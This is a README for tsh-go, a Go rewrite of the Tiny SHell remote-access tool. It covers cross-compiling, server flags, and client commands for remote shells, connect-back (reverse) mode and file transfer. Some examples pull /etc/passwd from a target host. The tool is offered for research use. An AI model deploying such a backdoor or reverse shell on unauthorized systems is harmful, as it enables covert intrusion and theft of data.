# tsh-go

This is [Tiny SHell](https://github.com/creaktive/tsh) rewritten in Go programming language.

## Disclaimer

This program is only for helping research or educational purpose,

**DON'T** use for illegal purpose or in any unauthorized environment.

## Description

I like tsh and I use it a lot in my daily research work. It's especially handy when researching devices that don't have built-in sshd or are network limited.

However, sometimes these devices use special systems or architectures that can make cross-compiling tsh painful. So I decided to rewrite tsh in go, and thanks to go's powerful cross-platform compilation capabilities, I can use tsh more easily on more systems and architectures.

For example, I successfully compiled to the following platforms:
- aix
- darwin
- dragonfly
- freebsd
- illumos
- netbsd
- openbsd
- solaris
- windows

## Usage

### Compiling

#### Help
```
$ make

Please specify one of these targets:
        make linux
        make windows

It can be compiled to other unix-like platforms supported by go compiler:
        GOOS=freebsd GOARCH=386 make unix

Get more with:
        go tool dist list
```

#### Build for linux

```
$ make linux
env GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o ./build/tshd_linux_amd64 cmd/tshd.go
env GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o ./build/tsh_linux_amd64 cmd/tsh.go
```

### How to use the tshd (server)

#### Help

```
$ ./build/tshd_linux_amd64 -h
Usage of tshd_linux_amd64:
  -c string
        connect back host
  -d int
        connect back delay (default 5)
  -daemon
        (internal used) is in daemon
  -p int
        port (default 1234)
  -s string
        secret (default "1234")
```

#### Listening on target

```
$ ./build/tshd_linux_amd64
```

#### Connect back mode

```
$ ./build/tshd_linux_amd64 -c <client hostname>
```

### How to use the tsh (client)

#### Help

```
$ ./build/tsh_linux_amd64 -h
Usage: ./tsh_linux_amd64 [-s secret] [-p port] <action>
  action:
        <hostname|cb> [command]
        <hostname|cb> get <source-file> <dest-dir>
        <hostname|cb> put <source-file> <dest-dir>
  -p int
        port (default 1234)
  -s string
        secret (default "1234")
```

#### Start a shell

```
$ ./build/tsh_linux_amd64 <server hostname>
```

#### Execute a command

```
$ ./build/tsh_linux_amd64 <server hostname> 'uname -a'
```

#### Transfer files

```
$ ./build/tsh_linux_amd64 <server hostname> get /etc/passwd .
$ ./build/tsh_linux_amd64 <server hostname> put myfile /tmp
```

#### Connect back mode

```
$ ./build/tsh_linux_amd64 cb
$ ./build/tsh_linux_amd64 cb get /etc/passwd .
$ ./build/tsh_linux_amd64 cb put myfile /tmp
```
